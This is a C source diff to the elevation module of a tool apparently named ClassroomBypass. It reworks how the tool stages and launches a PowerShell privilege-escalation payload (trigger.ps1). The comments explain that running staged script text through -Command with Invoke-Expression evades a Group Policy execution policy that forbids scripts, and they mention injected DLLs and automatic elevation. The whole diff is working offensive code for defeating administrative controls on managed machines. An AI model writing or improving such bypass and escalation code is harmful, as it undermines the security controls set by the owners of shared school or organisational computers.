@@ -25,20 +25,21 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdarg.h>
+#include <errno.h>
 
 #include "elevate.h"
 
 /* the ONE shared log: the launcher, the payload, the spawned children and
    the injected DLLs all append here (see also TruncateHookLog in bypass.c) */
 #define ELEVATE_LOG      "bypass_hook.log"
-#define ELEVATE_SELFTEST "bypass_elevate_selftest.b64"   /* debug, goes to %TEMP% */
 #define LPE_TRIGGER      "lpe\\trigger.ps1"
 
 /* CreateProcessA takes 32766 characters plus the NUL.  Sizing the buffer to
    exactly that keeps "the buffer is full" and "the API refuses" at the same
    threshold; a bigger buffer only moved the failure deeper (we would hand
-   CreateProcess a silently truncated Base64 blob and PowerShell would report
-   a decode error instead of the real reason). */
+   CreateProcess a silently truncated command line and PowerShell would report
+   something unrelated).  The payload itself is no longer spliced in here - only
+   its path is - so this is a ceiling we cannot realistically reach. */
 #define LPE_CMDLINE_MAX  32767
 
 /* How long the launcher waits for trigger.ps1 to unwind through its finally
@@ -312,16 +313,13 @@ static int RunHidden(char* cmdline, const char* logPath, HANDLE* outProc,
 
 /* ---------------- skip channel + job object ---------------- */
 
-/* %LOCALAPPDATA%\ClassroomBypass-LPE\abort.<pid>
-   Same directory as the Documents snapshot, for the same reason: bin\lpe can
-   be read-only (a copy under Program Files), and this file has to be writable
-   by a Medium-IL process.  The pid in the name keeps a file left by an earlier
-   run from cancelling this one - except when Windows reuses the pid, which is
-   why the file is also deleted before the script starts. */
-static int SkipFilePath(char* out, size_t n, DWORD pid)
+/* %LOCALAPPDATA%\ClassroomBypass-LPE - created on demand.  Shared by the abort
+   file, the materialized payload script and the Documents snapshot, for one
+   reason: bin\lpe can be read-only (a copy under Program Files) while all three
+   have to be written by a Medium-IL process. */
+static int LpeRoot(char* out, size_t n)
 {
     char  base[MAX_PATH];
-    char  dir[MAX_PATH];
     DWORD got;
     int   r;
 
@@ -331,9 +329,24 @@ static int SkipFilePath(char* out, size_t n, DWORD pid)
     got = GetEnvironmentVariableA("LOCALAPPDATA", base, sizeof(base));
     if (got == 0 || (size_t)got >= sizeof(base)) return 0;
 
-    r = _snprintf(dir, sizeof(dir), "%s\\ClassroomBypass-LPE", base);
-    if (r < 0 || (size_t)r >= sizeof(dir)) return 0;
-    CreateDirectoryA(dir, NULL);        /* already existing is the normal case */
+    r = _snprintf(out, n, "%s\\ClassroomBypass-LPE", base);
+    if (r < 0 || (size_t)r >= n) { out[0] = '\0'; return 0; }
+    CreateDirectoryA(out, NULL);        /* already existing is the normal case */
+    return 1;
+}
+
+/* %LOCALAPPDATA%\ClassroomBypass-LPE\abort.<pid>
+   The pid in the name keeps a file left by an earlier run from cancelling this
+   one - except when Windows reuses the pid, which is why the file is also
+   deleted before the script starts. */
+static int SkipFilePath(char* out, size_t n, DWORD pid)
+{
+    char dir[MAX_PATH];
+    int  r;
+
+    if (!out || n == 0) return 0;
+    out[0] = '\0';
+    if (!LpeRoot(dir, sizeof(dir))) return 0;
 
     r = _snprintf(out, n, "%s\\abort.%lu", dir, (unsigned long)pid);
     if (r < 0 || (size_t)r >= n) { out[0] = '\0'; return 0; }
@@ -776,125 +789,212 @@ static int TryUac(const char* cmdline, int silent)
 
 /* ---------------- policy-proof script execution ---------------- */
 
-/* The payload is run through -EncodedCommand: the execution policy (including
-   the GPO-enforced "scripts are forbidden" state that makes even
-   -ExecutionPolicy Bypass useless) only covers script *files*, so this always
-   starts.  The four variables the script expects are prepended here. */
+/* The payload used to go through -EncodedCommand, and that had a hard ceiling:
+   the script is converted to UTF-16 and then Base64 (~2.7x), and the result has
+   to fit in the 32767-character command line CreateProcessA accepts.
+   trigger.ps1 grew past that, so every LPE attempt ended in the log as
+   "encoded command does not fit" and fell back to UAC - the exploit leg was
+   dead while all of its unit tests still passed.
 
-static const char kB64[] =
-    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+   So the script now goes to a file and PowerShell is told to read and evaluate
+   it:
 
-static char* Base64Encode(const BYTE* data, size_t len)
-{
-    size_t outLen = ((len + 2) / 3) * 4 + 1;
-    char*  out = (char*)malloc(outLen);
-    size_t i, o = 0;
+     -Command "Invoke-Expression (Get-Content -LiteralPath '<path>' -Raw)"
 
-    if (!out) return NULL;
-    for (i = 0; i + 2 < len; i += 3) {
-        unsigned v = ((unsigned)data[i] << 16) |
-                     ((unsigned)data[i + 1] << 8) | data[i + 2];
-        out[o++] = kB64[(v >> 18) & 63];
-        out[o++] = kB64[(v >> 12) & 63];
-        out[o++] = kB64[(v >> 6) & 63];
-        out[o++] = kB64[v & 63];
-    }
-    if (i < len) {
-        unsigned v = (unsigned)data[i] << 16;
-        int      rem = (int)(len - i);
-        if (rem == 2) v |= (unsigned)data[i + 1] << 8;
-        out[o++] = kB64[(v >> 18) & 63];
-        out[o++] = kB64[(v >> 12) & 63];
-        out[o++] = (rem == 2) ? kB64[(v >> 6) & 63] : '=';
-        out[o++] = '=';
-    }
-    out[o] = '\0';
-    return out;
-}
+   What defeats a hostile execution policy is -Command, not the file: the policy
+   (including the GPO state that makes even -ExecutionPolicy Bypass useless)
+   governs script *files* run with -File, while text handed to -Command is
+   evaluated without consulting it.  Get-Content reads the file as data, so it
+   is not policy-checked either.
 
-/* single-quoted PowerShell string literal */
-static void PsQuote(char* out, size_t n, const char* s)
+   The file is written UTF-8 *with* a BOM: Windows PowerShell 5.1 decodes a
+   BOM-less file with the ANSI code page, which would mangle the non-ASCII part
+   of an install path in the preamble.  trigger.ps1 itself is pure ASCII.
+
+   Location: %LOCALAPPDATA%\ClassroomBypass-LPE\trigger.<pid>.<tick>.ps1 - the
+   same writable per-user directory as the abort file, so bin\lpe can be a
+   read-only copy under Program Files.  The variables the script expects are
+   prepended to it exactly as before. */
+
+/* Body of a single-quoted PowerShell string literal, without the quotes: every
+   ' has to be doubled.  Returns 0 if it did not fit - handing PowerShell a
+   truncated path would point it at a different file. */
+static int PsEscape(char* out, size_t n, const char* s)
 {
     size_t o = 0;
 
-    if (n < 3) { if (n) out[0] = '\0'; return; }
-    out[o++] = '\'';
-    while (*s && o + 3 < n) {
+    if (!n) return 0;
+    while (*s) {
+        size_t need = (*s == '\'') ? 2 : 1;
+
+        if (o + need >= n) { out[o] = '\0'; return 0; }
         if (*s == '\'') out[o++] = '\'';
         out[o++] = *s++;
     }
-    out[o++] = '\'';
     out[o] = '\0';
+    return 1;
 }
 
-static char* BuildEncodedCommand(const char* scriptPath, const char* repo,
-                                 const char* target, DWORD abortPid)
+/* single-quoted PowerShell string literal; 0 if it did not fit */
+static int PsQuote(char* out, size_t n, const char* s)
 {
-    FILE*    f;
-    char*    script;
-    char*    all;
-    char*    b64 = NULL;
-    wchar_t* wide = NULL;
-    char     qRepo[700];
+    size_t len;
+
+    if (n < 3) { if (n) out[0] = '\0'; return 0; }
+    if (!PsEscape(out + 1, n - 2, s)) { out[0] = '\0'; return 0; }
+    len = strlen(out + 1);
+    out[0]       = '\'';
+    out[1 + len] = '\'';
+    out[2 + len] = '\0';
+    return 1;
+}
+
+/* Writes "<preamble><script>" to destDir\trigger.<pid>.<tick>.ps1 and returns
+   its path.  $AbortPid is this launcher's pid: trigger.ps1 is our direct child,
+   so it cannot derive it from $PID (that is powershell's own pid) and should not
+   have to walk the WMI parent chain for one number. */
+static int MaterializeScript(const char* destDir, const char* scriptPath,
+                             const char* repo, const char* target,
+                             DWORD abortPid, char* outPath, size_t n)
+{
+    FILE*  f;
+    char*  script;
+    char   qRepo[2 * MAX_PATH + 8];
     /* 2 * 2048 + 8: both call sites keep target in a char[2048] and refuse to
        truncate it, and PowerShell quoting can at most double every byte.  The
        old 900-byte buffer silently cut the tail of a long command line, and the
        tail is where "--elevate=uac" lives. */
-    char     qTarget[2 * 2048 + 8];
-    char     pre[sizeof(qRepo) + sizeof(qTarget) + 96];
-    long     size;
-    int      wlen, npre;
+    char   qTarget[2 * 2048 + 8];
+    char   pre[sizeof(qRepo) + sizeof(qTarget) + 96];
+    long   size;
+    int    npre, r, ok;
+
+    if (!destDir || !outPath || n == 0) return 0;
+    outPath[0] = '\0';
 
     f = fopen(scriptPath, "rb");
-    if (!f) return NULL;
+    if (!f) return 0;
     fseek(f, 0, SEEK_END);
     size = ftell(f);
     fseek(f, 0, SEEK_SET);
-    if (size <= 0 || size > 200000) { fclose(f); return NULL; }
+    if (size <= 0 || size > 200000) { fclose(f); return 0; }
     script = (char*)malloc((size_t)size + 1);
-    if (!script) { fclose(f); return NULL; }
+    if (!script) { fclose(f); return 0; }
     if (fread(script, 1, (size_t)size, f) != (size_t)size) {
-        fclose(f); free(script); return NULL;
+        fclose(f); free(script); return 0;
     }
     fclose(f);
     script[size] = '\0';
-    if ((unsigned char)script[0] == 0xEF && (unsigned char)script[1] == 0xBB &&
-        (unsigned char)script[2] == 0xBF)
-        memmove(script, script + 3, (size_t)size - 2);   /* drop the BOM */
+    /* The file gets our own BOM below; a second one would be evaluated as a
+       stray character.  (The old memmove copied one byte past the buffer.) */
+    if (size >= 3 &&
+        (unsigned char)script[0] == 0xEF && (unsigned char)script[1] == 0xBB &&
+        (unsigned char)script[2] == 0xBF) {
+        memmove(script, script + 3, (size_t)size - 3);
+        size -= 3;
+        script[size] = '\0';
+    }
 
-    PsQuote(qRepo, sizeof(qRepo), repo);
-    PsQuote(qTarget, sizeof(qTarget), target);
-    /* AbortPid is the pid of THIS launcher: trigger.ps1 is our direct child, so
-       it cannot derive it from $PID (that is powershell's own pid) and should
-       not have to walk the WMI parent chain for one number. */
+    if (!PsQuote(qRepo, sizeof(qRepo), repo) ||
+        !PsQuote(qTarget, sizeof(qTarget), target)) {
+        ELog("lpe: preamble does not fit (repo or target too long)");
+        free(script);
+        return 0;
+    }
     npre = _snprintf(pre, sizeof(pre) - 1,
                      "$Repo=%s;$TargetCommand=%s;$TimeoutSec=45;$AbortPid=%lu;\r\n",
                      qRepo, qTarget, (unsigned long)abortPid);
     pre[sizeof(pre) - 1] = '\0';
     if (npre < 0 || npre >= (int)sizeof(pre) - 1) {
-        ELog("lpe: encoded preamble does not fit (%d bytes, max %u)",
+        ELog("lpe: preamble does not fit (%d bytes, max %u)",
              npre, (unsigned)sizeof(pre) - 2);
         free(script);
-        return NULL;
+        return 0;
     }
 
-    all = (char*)malloc(strlen(pre) + strlen(script) + 1);
-    if (all) {
-        strcpy(all, pre);
-        strcat(all, script);
-
-        wlen = MultiByteToWideChar(CP_UTF8, 0, all, -1, NULL, 0);
-        if (wlen > 0) {
-            wide = (wchar_t*)malloc((size_t)wlen * sizeof(wchar_t));
-            if (wide && MultiByteToWideChar(CP_UTF8, 0, all, -1, wide, wlen) > 0)
-                b64 = Base64Encode((const BYTE*)wide,
-                                   (size_t)(wlen - 1) * sizeof(wchar_t));
-        }
-        free(all);
+    r = _snprintf(outPath, n, "%s%strigger.%lu.%lu.ps1", destDir,
+                  (destDir[0] && destDir[strlen(destDir) - 1] == '\\') ? "" : "\\",
+                  (unsigned long)abortPid, (unsigned long)GetTickCount());
+    if (r < 0 || (size_t)r >= n) {
+        ELog("lpe: payload path does not fit in %u bytes", (unsigned)n);
+        outPath[0] = '\0';
+        free(script);
+        return 0;
     }
-    if (wide) free(wide);
+
+    f = fopen(outPath, "wb");
+    if (!f) {
+        ELog("lpe: cannot write %s (errno=%d)", outPath, errno);
+        outPath[0] = '\0';
+        free(script);
+        return 0;
+    }
+    ok = fwrite("\xEF\xBB\xBF", 1, 3, f) == 3 &&
+         fwrite(pre, 1, (size_t)npre, f) == (size_t)npre &&
+         fwrite(script, 1, (size_t)size, f) == (size_t)size;
+    if (fclose(f) != 0) ok = 0;
     free(script);
-    return b64;
+    if (!ok) {
+        ELog("lpe: short write to %s", outPath);
+        DeleteFileA(outPath);
+        outPath[0] = '\0';
+        return 0;
+    }
+    return 1;
+}
+
+/* "powershell" ... -Command "Invoke-Expression (Get-Content -LiteralPath '<p>' -Raw)"
+   The path is a single-quoted literal inside a double-quoted argument.  A
+   Windows path cannot contain '"', so ' is the only character to escape. */
+static int BuildLpeCommand(char* out, size_t n, const char* ps,
+                           const char* scriptPath)
+{
+    char q[2 * MAX_PATH + 8];
+    int  r;
+
+    if (!PsEscape(q, sizeof(q), scriptPath)) {
+        ELog("lpe: payload path too long for the command line");
+        return 0;
+    }
+    r = _snprintf(out, n,
+                  "\"%s\" -NoLogo -NoProfile -NonInteractive -Command "
+                  "\"Invoke-Expression (Get-Content -LiteralPath '%s' -Raw)\"",
+                  ps, q);
+    if (r < 0 || (size_t)r >= n) {
+        ELog("lpe: command line does not fit in %u bytes", (unsigned)n);
+        return 0;
+    }
+    return 1;
+}
+
+/* A kill between "write" and "delete" leaves trigger.<pid>.<tick>.ps1 behind.
+   The pid in the name is this process's, so the next run of the same pid
+   (Windows does reuse them) sweeps its own leftovers instead of accumulating
+   one file per hard kill. */
+static void DeleteStaleScripts(const char* root, DWORD pid)
+{
+    char             pattern[MAX_PATH];
+    WIN32_FIND_DATAA fd;
+    HANDLE           h;
+    int              removed = 0;
+    int              r;
+
+    r = _snprintf(pattern, sizeof(pattern), "%s%strigger.%lu.*.ps1", root,
+                  (root[0] && root[strlen(root) - 1] == '\\') ? "" : "\\",
+                  (unsigned long)pid);
+    if (r < 0 || (size_t)r >= sizeof(pattern)) return;
+
+    h = FindFirstFileA(pattern, &fd);
+    if (h == INVALID_HANDLE_VALUE) return;
+    do {
+        char path[MAX_PATH];
+
+        r = _snprintf(path, sizeof(path), "%s\\%s", root, fd.cFileName);
+        if (r > 0 && (size_t)r < sizeof(path) && DeleteFileA(path)) removed++;
+    } while (FindNextFileA(h, &fd));
+    FindClose(h);
+    if (removed)
+        ELog("lpe: removed %d stale payload script(s) from %s", removed, root);
 }
 
 static int g_lpeChildAbandoned;   /* the spawned child gave up (canceled UAC) */
@@ -913,10 +1013,13 @@ static int TryLpe(const char* cmdline)
        nothing else in this process touches these buffers. */
     static char cmd[LPE_CMDLINE_MAX], target[2048];
     char    exe[MAX_PATH];
-    char    abortPath[MAX_PATH];
+    char    abortPath[MAX_PATH], scriptTmp[MAX_PATH];
     HANDLE  proc = NULL, job = NULL;
     DWORD   t0, lastBeat, exitCode = 0, pid = 0, exitTick = 0, got, skipTick = 0;
     int     ok = 0, skipped = 0, i, n, stillRunning = 0;
+
+    abortPath[0] = '\0';
+    scriptTmp[0] = '\0';
 
     if (!ExeDir(dir, sizeof(dir))) return 0;
 
@@ -971,31 +1074,25 @@ static int TryLpe(const char* cmdline)
     }
 
     {
-        char  repo[MAX_PATH];
-        char* enc;
+        char root[MAX_PATH], repo[MAX_PATH];
 
-        if (!Join(repo, sizeof(repo), dir, "lpe")) return 0;
-        enc = BuildEncodedCommand(script, repo, target, GetCurrentProcessId());
-        if (!enc) {
-            ELog("lpe: cannot read/encode %s", script);
+        if (!LpeRoot(root, sizeof(root))) {
+            ELog("lpe: %%LOCALAPPDATA%% is not usable - cannot stage the payload");
             return 0;
         }
-        /* The script becomes UTF-16, then Base64 (4/3 of that), so the command
-           line grows ~2.7x.  With a 9.2 KB script that is ~25 KB, leaving room
-           for the script to reach ~12 KB before CreateProcessA refuses; past
-           that the exe must grow (or the payload must move out of -EncodedCommand). */
-        n = _snprintf(cmd, sizeof(cmd),
-                      "\"%s\" -NoLogo -NoProfile -NonInteractive -EncodedCommand %s",
-                      ps, enc);
-        free(enc);
-        if (n < 0 || n >= (int)sizeof(cmd)) {
-            ELog("lpe: encoded command does not fit in %u bytes (%d needed) - "
-                 "is the payload script too big?", (unsigned)sizeof(cmd), n);
+        DeleteStaleScripts(root, GetCurrentProcessId());
+        if (!Join(repo, sizeof(repo), dir, "lpe")) return 0;
+        if (!MaterializeScript(root, script, repo, target, GetCurrentProcessId(),
+                               scriptTmp, sizeof(scriptTmp)))
+            return 0;
+        if (!BuildLpeCommand(cmd, sizeof(cmd), ps, scriptTmp)) {
+            DeleteFileA(scriptTmp);
+            scriptTmp[0] = '\0';
             return 0;
         }
     }
 
-    ELog("lpe: payload %s (encoded command)", script);
+    ELog("lpe: payload %s -> %s", script, scriptTmp);
 
     /* Both prepared before the script starts: the abort file so that a stale
        one (same pid, earlier run) cannot read as "the user already skipped",
@@ -1007,6 +1104,7 @@ static int TryLpe(const char* cmdline)
 
     if (!RunHidden(cmd, hookLog, &proc, job)) {
         CloseJob(job);                  /* empty job: nothing inside to kill */
+        DeleteFileA(scriptTmp);         /* the child never started */
         return 0;
     }
 
@@ -1132,6 +1230,13 @@ static int TryLpe(const char* cmdline)
        the pid-named file would otherwise sit in %LOCALAPPDATA% forever. */
     if (abortPath[0]) DeleteFileA(abortPath);
 
+    /* Same for the staged script.  By the time we get here the child has either
+       read it (Get-Content is its first statement, and every exit from the loop
+       above is at least one handshake / process exit later), exited, or been
+       terminated - so nothing is still opening it.  A hard kill leaves it for
+       DeleteStaleScripts / cleanup_lpe.ps1. */
+    if (scriptTmp[0]) DeleteFileA(scriptTmp);
+
     if (ok) {
         ELog("lpe: elevated instance pid=%lu is running", (unsigned long)pid);
         StatusSetText("自动提权成功，正在启动…");
@@ -1194,35 +1299,42 @@ int Elevate_Boot(HWND owner, const char* cmdline, int silent)
        back to the launcher. */
     int isChild = Elevate_IsSpawnedChildCmd(cmdline);
 
-    /* Debug hook: dump the -EncodedCommand payload so it can be diffed against
-       what PowerShell itself would produce.  Never starts anything; the blob
-       goes to %TEMP% so bin\ stays clean. */
+    /* Debug hook: stage the payload script exactly as TryLpe would (into %TEMP%
+       instead of the LPE root, so bin\ stays clean), then log the command line.
+       Never starts anything.  This is the check for "the LPE leg silently fell
+       back to UAC": run `bypass.exe --elevate-selftest`, read the two lines, and
+       paste the command into a console to see the real failure. */
     if (cmdline && strstr(cmdline, "--elevate-selftest")) {
-        char script[MAX_PATH], repo[MAX_PATH], temp[MAX_PATH], out[MAX_PATH];
-        char* enc;
-        FILE* f;
+        char  script[MAX_PATH], repo[MAX_PATH], temp[MAX_PATH], out[MAX_PATH];
+        char  target[2048], exe[MAX_PATH], ps[MAX_PATH];
+        char  line[LPE_CMDLINE_MAX];
+        DWORD got;
 
         if (!ExeSibling(script, sizeof(script), LPE_TRIGGER)) return 0;
         if (!ExeSibling(repo, sizeof(repo), "lpe")) return 0;
-        {
-            char target[2048], exe[MAX_PATH];
-            GetModuleFileNameA(NULL, exe, sizeof(exe));
-            _snprintf(target, sizeof(target) - 1, "\"%s\"", exe);
-            target[sizeof(target) - 1] = '\0';
-            enc = BuildEncodedCommand(script, repo, target, GetCurrentProcessId());
-        }
-        if (!enc) {
-            ELog("selftest: cannot read/encode %s", script);
+        if (!FindPowerShell(ps, sizeof(ps))) {
+            ELog("selftest: powershell.exe not found");
             return 0;
         }
-        if (!GetTempPathA(sizeof(temp), temp)) temp[0] = '\0';
-        _snprintf(out, sizeof(out) - 1, "%s%s", temp, ELEVATE_SELFTEST);
-        out[sizeof(out) - 1] = '\0';
-        f = fopen(out, "wb");
-        if (f) { fwrite(enc, 1, strlen(enc), f); fclose(f); }
-        ELog("selftest: encoded command (%lu bytes) -> %s",
-             (unsigned long)strlen(enc), out);
-        free(enc);
+        got = GetModuleFileNameA(NULL, exe, sizeof(exe));
+        if (got == 0 || got >= sizeof(exe)) return 0;
+        _snprintf(target, sizeof(target) - 1, "\"%s\"", exe);
+        target[sizeof(target) - 1] = '\0';
+        if (!GetTempPathA(sizeof(temp), temp)) {
+            ELog("selftest: %%TEMP%% is not set");
+            return 0;
+        }
+        if (!MaterializeScript(temp, script, repo, target,
+                               GetCurrentProcessId(), out, sizeof(out))) {
+            ELog("selftest: cannot stage %s under %s", script, temp);
+            return 0;
+        }
+        if (!BuildLpeCommand(line, sizeof(line), ps, out)) {
+            DeleteFileA(out);
+            return 0;
+        }
+        ELog("selftest: payload script -> %s", out);
+        ELog("selftest: %s", line);
         return 0;
     }
 
